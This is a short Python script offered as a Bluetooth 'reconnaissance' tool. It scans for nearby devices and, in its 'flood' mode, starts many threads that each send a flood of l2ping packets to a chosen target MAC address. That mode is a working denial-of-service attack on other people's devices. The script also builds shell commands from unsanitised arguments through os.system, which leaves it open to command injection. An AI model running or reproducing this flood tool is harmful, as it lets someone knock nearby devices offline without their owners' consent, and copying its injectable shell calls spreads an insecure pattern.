import argparse
import os
from threading import Thread

parser = argparse.ArgumentParser(description="Coffin Bluetooth Reconissance")
parser.add_argument('-i','--interface', type=str, metavar="",required=True,help="Set the bluetooth interfce.")
parser.add_argument('-p','--packet', type=str, metavar="",help="Set the number of ping packets to flood.")
parser.add_argument('-t','--target', type=str, metavar="",help="Set the target's mac-address.")
parser.add_argument('-T','--threads', type=int, metavar="",help="Set the target's mac-address.")
parser.add_argument('-m','--mode', type=str, metavar="",help="info, flood, scan.")

args = parser.parse_args()
threads = int(args.threads)

def flood():
	os.system(f'l2ping -i {args.interface} -s {args.packet} -f {args.target}')

if args.mode == "info":
	print(os.system("hciconfig"))

elif args.mode == "scan":
	print(os.system(f"hcitool -i {args.interface} scan"))	

elif args.mode == "flood":
	try:
		for x in range (int(args.threads)):
			Thread(target=flood).start()
	except Exception as e:
		print(e)
		
		
